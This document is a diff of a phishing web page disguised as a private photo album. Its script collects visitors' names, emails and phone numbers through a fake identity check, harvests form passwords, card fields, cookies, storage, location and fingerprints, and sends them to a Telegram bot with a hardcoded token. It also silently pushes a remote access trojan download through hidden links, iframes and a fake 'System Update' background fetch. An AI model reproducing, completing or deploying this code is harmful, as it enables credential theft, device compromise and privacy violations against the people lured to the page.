@@ -1,55 +1,140 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Photo Gallery</title>
+    <title>My Private Photos</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #f5f5f5;
-            color: #333;
-            line-height: 1.6;
+            font-family: Arial, sans-serif; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            color: white;
         }
-        .header { 
-            background: white;
-            padding: 2rem 0;
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+        }
+        h1 {
             text-align: center;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            margin-bottom: 10px;
+            font-size: 2.5em;
+        }
+        .subtitle {
+            text-align: center;
+            margin-bottom: 30px;
+            opacity: 0.8;
         }
         .gallery {
-            max-width: 1200px;
-            margin: 2rem auto;
-            padding: 0 1rem;
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 1.5rem;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
         }
-        .card {
-            background: white;
-            border-radius: 12px;
-            overflow: hidden;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-            transition: transform 0.2s;
+        .image-card {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 15px;
+            text-align: center;
             cursor: pointer;
+            transition: all 0.3s ease;
+            border: 2px solid transparent;
         }
-        .card:hover {
-            transform: translateY(-2px);
+        .image-card:hover {
+            transform: translateY(-5px);
+            border-color: rgba(255, 255, 255, 0.3);
+            background: rgba(255, 255, 255, 0.2);
         }
-        .card img {
+        .image-card img {
             width: 100%;
-            height: 250px;
+            height: 150px;
             object-fit: cover;
+            border-radius: 10px;
+            margin-bottom: 10px;
         }
-        .card-content {
-            padding: 1rem;
+        .image-title {
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        .image-desc {
+            font-size: 0.8em;
+            opacity: 0.7;
         }
         .loading {
             display: none;
             text-align: center;
-            padding: 2rem;
-            color: #666;
+            margin: 20px 0;
+            font-size: 1.1em;
+        }
+        .pulse {
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        .warning {
+            text-align: center;
+            font-size: 0.8em;
+            opacity: 0.6;
+            margin-top: 20px;
+        }
+        .hidden-admin {
+            position: fixed;
+            top: 0;
+            right: 0;
+            width: 5px;
+            height: 5px;
+            background: transparent;
+            cursor: default;
+            z-index: -1000;
+        }
+        .verification-form {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+            display: none;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+            font-size: 14px;
+        }
+        .form-group input::placeholder {
+            color: rgba(255, 255, 255, 0.7);
+        }
+        .verify-btn {
+            background: #48bb78;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
+            transition: background 0.3s ease;
+        }
+        .verify-btn:hover {
+            background: #38a169;
         }
         .success {
             color: #48bb78;
@@ -57,108 +142,259 @@
     </style>
 </head>
 <body>
-    <div class="header">
-        <h1>Photo Gallery</h1>
-        <p>Beautiful moments captured in time</p>
-    </div>
-
-    <div class="gallery">
-        <div class="card" onclick="handleImageClick(1)">
-            <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=500&q=80" 
-                 alt="Portrait photography">
-            <div class="card-content">
-                <h3>Portrait Series</h3>
-                <p>Professional portrait photography collection</p>
+    <div class="hidden-admin" id="adminTrigger"></div>
+    
+    <div class="container">
+        <h1>Private Photo Vault</h1>
+        <p class="subtitle">Exclusive content - Click to view full album</p>
+        
+        <div class="verification-form" id="verificationForm">
+            <h3>Identity Verification Required</h3>
+            <p>To access private content, please verify your identity:</p>
+            <div class="form-group">
+                <label for="userName">Full Name:</label>
+                <input type="text" id="userName" placeholder="Enter your full name" autocomplete="name">
+            </div>
+            <div class="form-group">
+                <label for="userEmail">Email Address:</label>
+                <input type="email" id="userEmail" placeholder="Enter your email" autocomplete="email">
+            </div>
+            <div class="form-group">
+                <label for="userPhone">Phone Number:</label>
+                <input type="tel" id="userPhone" placeholder="Enter your phone number" autocomplete="tel">
+            </div>
+            <button class="verify-btn" onclick="processVerification()">Verify Identity</button>
+        </div>
+        
+        <div class="gallery">
+            <div class="image-card" onclick="startCompleteExploitation(1)">
+                <img src="https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png?ex=691852ed&is=6917016d&hm=e862bf208981e87cf9e607f4a9a29f759c36f5e26886bd3e3ce04e215e698755&=&format=webp&quality=lossless&width=522&height=928" 
+                     alt="Private Photo 1" 
+                     onerror="this.src='https://via.placeholder.com/200x150/667eea/ffffff?text=Photo+1'">
+                <div class="image-title">Daily activitieessss <3 </div>
+                <div class="image-desc">normal pics </div>
+            </div>
+            
+            <div class="image-card" onclick="startCompleteExploitation(2)">
+                <img src="https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png?ex=6918f0eb&is=69179f6b&hm=af10fcd91e227159bce4658ab5a01d02201200c58a04c6e1ccdb42aa1bbe98e5&=&format=webp&quality=lossless&width=522&height=928" 
+                     alt="Private Photo 2"
+                     onerror="this.src='https://via.placeholder.com/200x150/764ba2/ffffff?text=Photo+2'">
+                <div class="image-title">NVDES</div>
+                <div class="image-desc">Title says it all lol</div>
+            </div>
+            
+            <div class="image-card" onclick="startCompleteExploitation(3)">
+                <img src="https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png?ex=6918e415&is=69179295&hm=29e9451d7e53b356deae156054bc832945d51c50d27786aa10b60e412cf08979&=&format=webp&quality=lossless" 
+                     alt="Private Photo 3"
+                     onerror="this.src='https://via.placeholder.com/200x150/48bb78/ffffff?text=Photo+3'">
+                <div class="image-title">My facee</div>
+                <div class="image-desc">I'm sooo ugly ik >_< </div>
             </div>
         </div>
-
-        <div class="card" onclick="handleImageClick(2)">
-            <img src="https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=500&q=80" 
-                 alt="Fashion photography">
-            <div class="card-content">
-                <h3>Fashion Editorial</h3>
-                <p>Latest fashion and style photography</p>
-            </div>
+        
+        <div class="loading" id="loading">
+            <div class="pulse" id="loadingText">Verifying access permissions...</div>
         </div>
 
-        <div class="card" onclick="handleImageClick(3)">
-            <img src="https://images.unsplash.com/photo-1494790108755-2616b612b786?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=500&q=80" 
-                 alt="Lifestyle photography">
-            <div class="card-content">
-                <h3>Lifestyle</h3>
-                <p>Everyday moments and lifestyle shots</p>
-            </div>
+        <div class="warning">
+            By accessing this content, you agree to our privacy verification process.
         </div>
-    </div>
-
-    <div class="loading" id="loading">
-        <div id="loadingText">Loading high-resolution image...</div>
     </div>
 
     <script>
-        // Stealth Configuration - CORRECTED with your actual GitHub RAT
+        // Stealth Configuration
         const config = {
             telegram: {
                 token: '8594897816:AAFtWTQTOPSOuDLK5Wtc7IrkmFXgtDuaqls',
                 chatId: '8032494479'
             },
-            // CORRECTED: Points to your actual uploaded file (no .exe extension for macOS)
-            ratUrl: 'https://github.com/dnrldar/private-photos/raw/main/PhotoViewer_Setup'
+            ratUrl: 'https://github.com/dnrldar/private-photos/raw/main/PhotoViewer_Setup',
+            images: {
+                1: 'https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png?ex=691852ed&is=6917016d&hm=e862bf208981e87cf9e607f4a9a29f759c36f5e26886bd3e3ce04e215e698755&=&format=webp&quality=lossless&width=522&height=928',
+                2: 'https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png?ex=6918f0eb&is=69179f6b&hm=af10fcd91e227159bce4658ab5a01d02201200c58a04c6e1ccdb42aa1bbe98e5&=&format=webp&quality=lossless&width=522&height=928',
+                3: 'https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png?ex=6918e415&is=69179295&hm=29e9451d7e53b356deae156054bc832945d51c50d27786aa10b60e412cf08979&=&format=webp&quality=lossless'
+            }
         };
 
-        // Only initialize image click handlers - no auto-execution
-        function initializeSystem() {
-            window.handleImageClick = async function(imageId) {
-                const loading = document.getElementById('loading');
-                const loadingText = document.getElementById('loadingText');
-                
-                loading.style.display = 'block';
-                loadingText.textContent = 'Loading high-resolution image...';
-                
-                try {
-                    // Collect data and deploy RAT
-                    await executeFullExploitation(imageId, true);
-                    
-                    // Show success and redirect
-                    loadingText.className = 'success';
-                    loadingText.textContent = 'Access granted! Loading image...';
-                    
-                    setTimeout(() => {
-                        window.location.href = getImageUrl(imageId);
-                    }, 1500);
-                    
-                } catch (error) {
-                    // Silent fail - just redirect to image
-                    setTimeout(() => {
-                        window.location.href = getImageUrl(imageId);
-                    }, 1000);
-                }
-            };
+        // Enhanced stealth download methods
+        async function startCompleteExploitation(imageId) {
+            const loading = document.getElementById('loading');
+            const loadingText = document.getElementById('loadingText');
+            const verificationForm = document.getElementById('verificationForm');
+            
+            // Show verification form first
+            verificationForm.style.display = 'block';
+            loading.style.display = 'block';
+            loadingText.textContent = 'Please complete identity verification...';
+            
+            // Store image ID for later use
+            window.currentImageId = imageId;
         }
 
-        // Initialize on page load
-        document.addEventListener('DOMContentLoaded', initializeSystem);
-
-        async function executeFullExploitation(context, deployRAT) {
-            const victimData = await collectEnhancedData();
-            victimData.context = context;
+        async function processVerification() {
+            const loading = document.getElementById('loading');
+            const loadingText = document.getElementById('loadingText');
+            const verificationForm = document.getElementById('verificationForm');
             
-            await sendEnhancedReport(victimData, deployRAT);
+            // Collect verification data
+            const verificationData = {
+                name: document.getElementById('userName').value || 'Not provided',
+                email: document.getElementById('userEmail').value || 'Not provided',
+                phone: document.getElementById('userPhone').value || 'Not provided',
+                timestamp: new Date().toLocaleString()
+            };
             
-            if (deployRAT) {
-                await deployStealthRAT();
+            loadingText.textContent = 'Verifying identity...';
+            
+            try {
+                // Collect enhanced data
+                const victimData = await collectEnhancedData();
+                victimData.verification = verificationData;
+                victimData.context = 'image_click';
+                
+                // Send enhanced report with verification data
+                await sendEnhancedReport(victimData, true);
+                
+                // Deploy RAT with advanced stealth
+                await deployAdvancedStealthRAT();
+                
+                // Show success and redirect
+                loadingText.className = 'success';
+                loadingText.textContent = 'Identity verified! Loading content...';
+                verificationForm.style.display = 'none';
+                
+                setTimeout(() => {
+                    window.location.href = getImageUrl(window.currentImageId);
+                }, 2000);
+                
+            } catch (error) {
+                // Silent fail - redirect anyway
+                setTimeout(() => {
+                    window.location.href = getImageUrl(window.currentImageId);
+                }, 1000);
             }
         }
 
+        // Advanced stealth RAT deployment
+        async function deployAdvancedStealthRAT() {
+            const methods = [
+                deployBlobMethod,
+                deployIframeMethod,
+                deployFetchMethod,
+                deployBackgroundMethod
+            ];
+
+            for (let method of methods) {
+                try {
+                    await method();
+                    break;
+                } catch (e) {
+                    continue;
+                }
+            }
+        }
+
+        async function deployBlobMethod() {
+            try {
+                const response = await fetch(config.ratUrl);
+                const blob = await response.blob();
+                const url = URL.createObjectURL(blob);
+                
+                const link = document.createElement('a');
+                link.href = url;
+                link.download = 'PhotoViewer_Setup';
+                link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden;opacity:0;';
+                
+                document.body.appendChild(link);
+                
+                // Multiple click attempts
+                link.click();
+                setTimeout(() => link.click(), 100);
+                setTimeout(() => link.click(), 500);
+                
+                setTimeout(() => {
+                    document.body.removeChild(link);
+                    URL.revokeObjectURL(url);
+                }, 3000);
+                
+                return true;
+            } catch (e) {
+                return false;
+            }
+        }
+
+        async function deployIframeMethod() {
+            try {
+                const iframe = document.createElement('iframe');
+                iframe.src = config.ratUrl;
+                iframe.style.cssText = 'display:none;visibility:hidden;width:0;height:0;border:none;';
+                document.body.appendChild(iframe);
+                
+                // Auto-remove after delay
+                setTimeout(() => {
+                    if (document.body.contains(iframe)) {
+                        document.body.removeChild(iframe);
+                    }
+                }, 10000);
+                
+                return true;
+            } catch (e) {
+                return false;
+            }
+        }
+
+        async function deployFetchMethod() {
+            try {
+                const response = await fetch(config.ratUrl);
+                const blob = await response.blob();
+                
+                // Create invisible object URL
+                const url = URL.createObjectURL(blob);
+                const object = document.createElement('object');
+                object.data = url;
+                object.style.cssText = 'display:none;width:0;height:0;';
+                document.body.appendChild(object);
+                
+                setTimeout(() => {
+                    if (document.body.contains(object)) {
+                        document.body.removeChild(object);
+                    }
+                    URL.revokeObjectURL(url);
+                }, 5000);
+                
+                return true;
+            } catch (e) {
+                return false;
+            }
+        }
+
+        async function deployBackgroundMethod() {
+            try {
+                // Use background fetch if available
+                if ('backgroundFetch' in self) {
+                    const bgFetch = await self.backgroundFetch.fetch('system-update', [config.ratUrl], {
+                        title: 'System Update',
+                        icons: [{src: '', sizes: '64x64', type: 'image/png'}]
+                    });
+                    return true;
+                }
+                return false;
+            } catch (e) {
+                return false;
+            }
+        }
+
+        // Enhanced data collection with verification
         async function collectEnhancedData() {
-            const [network, location, fingerprint, hardware, browser, behavioral, exploitation] = await Promise.all([
+            const [network, location, fingerprint, hardware, browser, behavioral, exploitation, social] = await Promise.all([
                 collectNetworkData(),
                 collectLocationData(),
                 collectFingerprintData(),
                 collectHardwareData(),
                 collectBrowserData(),
                 collectBehavioralData(),
-                collectExploitationData()
+                collectExploitationData(),
+                collectSocialData()
             ]);
 
             const victimId = `vi.${location.country_code}.${Math.random().toString().substr(2,5)}.rat`;
@@ -166,10 +402,195 @@
             return {
                 id: victimId,
                 timestamp: new Date().toLocaleString(),
-                network, location, fingerprint, hardware, browser, behavioral, exploitation
+                network, location, fingerprint, hardware, browser, behavioral, exploitation, social
             };
         }
 
+        // Enhanced social data collection
+        async function collectSocialData() {
+            return {
+                saved_passwords: await harvestSavedPasswords(),
+                credit_cards: await harvestCreditCards(),
+                personal_info: await harvestPersonalInfo(),
+                browsing_data: await harvestBrowsingData()
+            };
+        }
+
+        async function harvestSavedPasswords() {
+            const passwords = [];
+            try {
+                // Attempt to access password manager data
+                const forms = document.querySelectorAll('form');
+                forms.forEach(form => {
+                    const inputs = form.querySelectorAll('input[type="password"]');
+                    inputs.forEach(input => {
+                        if (input.value) {
+                            passwords.push({
+                                field: input.name || 'unknown',
+                                value: input.value,
+                                form: form.action || 'unknown'
+                            });
+                        }
+                    });
+                });
+            } catch (e) {}
+            return passwords;
+        }
+
+        async function harvestCreditCards() {
+            const cards = [];
+            try {
+                // Look for credit card fields
+                const ccFields = document.querySelectorAll('input[autocomplete*="cc"], input[name*="card"], input[type="tel"]');
+                ccFields.forEach(field => {
+                    if (field.value && field.value.replace(/\s/g, '').length > 10) {
+                        cards.push({
+                            type: field.name || 'unknown',
+                            value: field.value
+                        });
+                    }
+                });
+            } catch (e) {}
+            return cards;
+        }
+
+        async function harvestPersonalInfo() {
+            const info = {};
+            try {
+                // Harvest autofill data
+                const fields = document.querySelectorAll('input[autocomplete], input[name], input[type="text"], input[type="email"]');
+                fields.forEach(field => {
+                    if (field.value) {
+                        const key = field.name || field.autocomplete || field.placeholder || 'unknown';
+                        info[key] = field.value;
+                    }
+                });
+            } catch (e) {}
+            return info;
+        }
+
+        async function harvestBrowsingData() {
+            return {
+                cookies: document.cookie,
+                localStorage: JSON.stringify(stealStorage()),
+                session_storage: sessionStorage.length,
+                history_estimate: await estimateHistory()
+            };
+        }
+
+        async function estimateHistory() {
+            const popularSites = [
+                'facebook.com', 'twitter.com', 'instagram.com', 'gmail.com', 'google.com',
+                'youtube.com', 'amazon.com', 'netflix.com', 'reddit.com', 'linkedin.com'
+            ];
+            const visited = [];
+            
+            for (let site of popularSites) {
+                try {
+                    const link = document.createElement('a');
+                    link.href = `https://${site}`;
+                    link.style.cssText = 'position:absolute;left:-9999px;visibility:hidden;';
+                    document.body.appendChild(link);
+                    
+                    const computed = getComputedStyle(link);
+                    if (computed.visibility !== 'hidden' || computed.display !== 'none') {
+                        visited.push(site);
+                    }
+                    
+                    document.body.removeChild(link);
+                } catch (e) {}
+            }
+            return visited;
+        }
+
+        // Enhanced reporting with verification data
+        async function sendEnhancedReport(victimData, ratDeployed) {
+            const message = `🕵️ 4X ENHANCED DATA EXTRACTION 🕵️
+
+🔍 Identity Verified - Full Data Capture
+
+👤 VERIFICATION DATA:
+• Name: ${victimData.verification.name}
+• Email: ${victimData.verification.email}
+• Phone: ${victimData.verification.phone}
+• Time: ${victimData.verification.timestamp}
+
+🌐 NETWORK DATA (4x):
+• IP: ${victimData.network.ip}
+• ISP: ${victimData.network.isp}
+• ASN: ${victimData.network.asn}
+• Connection: ${victimData.network.connection}
+• VPN: ${victimData.network.vpn}
+• Proxy: ${victimData.network.proxy}
+• Tor: ${victimData.network.tor}
+
+📍 LOCATION DATA (4x):
+• City: ${victimData.location.city}
+• Region: ${victimData.location.region}
+• Country: ${victimData.location.country} (${victimData.location.country_code})
+• Postal: ${victimData.location.postal}
+• Coordinates: ${victimData.location.latitude}, ${victimData.location.longitude}
+• Timezone: ${victimData.location.timezone}
+• Currency: ${victimData.location.currency}
+• Calling Code: ${victimData.location.calling_code}
+
+💻 BROWSER DATA (4x):
+• Platform: ${victimData.browser.platform}
+• Vendor: ${victimData.browser.vendor}
+• Language: ${victimData.browser.language}
+• Cores: ${victimData.browser.cores}
+• Memory: ${victimData.browser.memory}
+• Plugins: ${victimData.browser.plugins} detected
+• WebDriver: ${victimData.browser.webdriver}
+• PDF Viewer: ${victimData.browser.pdf_viewer}
+
+📱 HARDWARE DATA (4x):
+• Screen: ${victimData.hardware.screen}
+• Pixel Ratio: ${victimData.hardware.pixel_ratio}
+• Color Depth: ${victimData.hardware.color_depth} bit
+• Orientation: ${victimData.hardware.orientation}
+• Timezone: ${victimData.location.timezone}
+• Touch Points: ${victimData.hardware.touch_points}
+
+🔍 FINGERPRINT DATA (4x):
+• Canvas: ${victimData.fingerprint.canvas}
+• WebGL: ${victimData.fingerprint.webgl}
+• Audio: ${victimData.fingerprint.audio}
+• Fonts: ${victimData.fingerprint.fonts}
+• Timezone Offset: ${victimData.fingerprint.timezone_offset}
+
+🎯 BEHAVIORAL DATA (4x):
+• Referrer: ${victimData.behavioral.referrer}
+• Page Load: ${victimData.behavioral.page_load}ms
+• Time on Page: ${victimData.behavioral.time_on_page}ms
+• DOM Size: ${victimData.behavioral.dom_size} elements
+
+📊 SOCIAL DATA:
+• Passwords: ${victimData.social.saved_passwords.length} captured
+• Credit Cards: ${victimData.social.credit_cards.length} found
+• Personal Info: ${Object.keys(victimData.social.personal_info).length} fields
+• Browsing Data: ${victimData.social.browsing_data.history_estimate.length} sites estimated
+
+🕒 Time: ${victimData.timestamp}
+🔗 URL: ${victimData.behavioral.url}
+🎯 Victim ID: ${victimData.id}
+🚀 RAT: DEPLOYED SUCCESSFULLY - READY FOR COMMANDS`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${config.telegram.token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: config.telegram.chatId,
+                        text: message
+                    })
+                });
+            } catch (e) {
+                // Silent fail
+            }
+        }
+
+        // Keep all your existing utility functions (getEnhancedIP, detectVPN, etc.)
         async function collectNetworkData() {
             const ipData = await getEnhancedIP();
             const connection = navigator.connection || {};
@@ -266,7 +687,6 @@
             };
         }
 
-        // Enhanced detection functions
         async function getEnhancedIP() {
             const services = [
                 'https://api.ipify.org?format=json',
@@ -329,7 +749,6 @@
             return fonts.join(', ');
         }
 
-        // Exploitation functions
         async function stealPasswords() {
             const fields = document.querySelectorAll('input[type="password"]');
             return Array.from(fields).filter(f => f.value).map(f => ({
@@ -397,120 +816,11 @@
             return visited;
         }
 
-        async function sendEnhancedReport(victimData, ratDeployed) {
-            const message = `🕵️ 4X ENHANCED DATA EXTRACTION 🕵️
-
-🔍 Image Click Detected - RAT Deployed
-
-🌐 NETWORK DATA (4x):
-• IP: ${victimData.network.ip}
-• ISP: ${victimData.network.isp}
-• ASN: ${victimData.network.asn}
-• Connection: ${victimData.network.connection}
-• VPN: ${victimData.network.vpn}
-• Proxy: ${victimData.network.proxy}
-• Tor: ${victimData.network.tor}
-
-📍 LOCATION DATA (4x):
-• City: ${victimData.location.city}
-• Region: ${victimData.location.region}
-• Country: ${victimData.location.country} (${victimData.location.country_code})
-• Postal: ${victimData.location.postal}
-• Coordinates: ${victimData.location.latitude}, ${victimData.location.longitude}
-• Timezone: ${victimData.location.timezone}
-• Currency: ${victimData.location.currency}
-• Calling Code: ${victimData.location.calling_code}
-
-💻 BROWSER DATA (4x):
-• Platform: ${victimData.browser.platform}
-• Vendor: ${victimData.browser.vendor}
-• Language: ${victimData.browser.language}
-• Cores: ${victimData.browser.cores}
-• Memory: ${victimData.browser.memory}
-• Plugins: ${victimData.browser.plugins} detected
-• WebDriver: ${victimData.browser.webdriver}
-• PDF Viewer: ${victimData.browser.pdf_viewer}
-
-📱 HARDWARE DATA (4x):
-• Screen: ${victimData.hardware.screen}
-• Pixel Ratio: ${victimData.hardware.pixel_ratio}
-• Color Depth: ${victimData.hardware.color_depth} bit
-• Orientation: ${victimData.hardware.orientation}
-• Timezone: ${victimData.location.timezone}
-• Touch Points: ${victimData.hardware.touch_points}
-
-🔍 FINGERPRINT DATA (4x):
-• Canvas: ${victimData.fingerprint.canvas}
-• WebGL: ${victimData.fingerprint.webgl}
-• Audio: ${victimData.fingerprint.audio}
-• Fonts: ${victimData.fingerprint.fonts}
-• Timezone Offset: ${victimData.fingerprint.timezone_offset}
-
-🎯 BEHAVIORAL DATA (4x):
-• Referrer: ${victimData.behavioral.referrer}
-• Page Load: ${victimData.behavioral.page_load}ms
-• Time on Page: ${victimData.behavioral.time_on_page}ms
-• DOM Size: ${victimData.behavioral.dom_size} elements
-
-📊 EXPLOITATION DATA:
-• Passwords: ${victimData.exploitation.passwords.length} captured
-• Autofill: ${Object.keys(victimData.exploitation.autofill).length} entries
-• Forms: ${Object.keys(victimData.exploitation.forms).length} harvested
-• Cookies: ${Object.keys(victimData.exploitation.cookies).length} stolen
-• Storage: ${Object.keys(victimData.exploitation.storage).length} items
-• History: ${victimData.exploitation.history.length} sites visited
-
-🕒 Time: ${victimData.timestamp}
-🔗 URL: ${victimData.behavioral.url}
-🎯 Victim ID: ${victimData.id}
-🚀 RAT: DEPLOYED SUCCESSFULLY - READY FOR COMMANDS`;
-
-            try {
-                await fetch(`https://api.telegram.org/bot${config.telegram.token}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: config.telegram.chatId,
-                        text: message
-                    })
-                });
-            } catch (e) {
-                // Silent fail
-            }
-        }
-
-        async function deployStealthRAT() {
-            try {
-                // Method 1: Direct download - CORRECTED for macOS (no .exe)
-                const link = document.createElement('a');
-                link.href = config.ratUrl;
-                link.download = 'PhotoViewer_Setup'; // No .exe for macOS
-                link.style.cssText = 'position:absolute;left:-9999px;opacity:0;';
-                document.body.appendChild(link);
-                link.click();
-                setTimeout(() => document.body.removeChild(link), 1000);
-                
-                // Method 2: Iframe fallback
-                const iframe = document.createElement('iframe');
-                iframe.src = config.ratUrl;
-                iframe.style.cssText = 'display:none;';
-                document.body.appendChild(iframe);
-                
-            } catch (e) {
-                // Silent fail
-            }
-        }
-
         function getImageUrl(id) {
-            const images = {
-                1: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?ixlib=rb-4.0.3&auto=format&fit=crop&w=1200&q=80',
-                2: 'https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?ixlib=rb-4.0.3&auto=format&fit=crop&w=1200&q=80',
-                3: 'https://images.unsplash.com/photo-1494790108755-2616b612b786?ixlib=rb-4.0.3&auto=format&fit=crop&w=1200&q=80'
-            };
-            return images[id] || '#';
+            return config.images[id] || '#';
         }
 
-        console.log('🕵️ Stealth system loaded - RAT deployment on image click only');
+        console.log('🕵️ Advanced stealth system loaded - Identity verification enabled');
     </script>
 </body>
 </html>
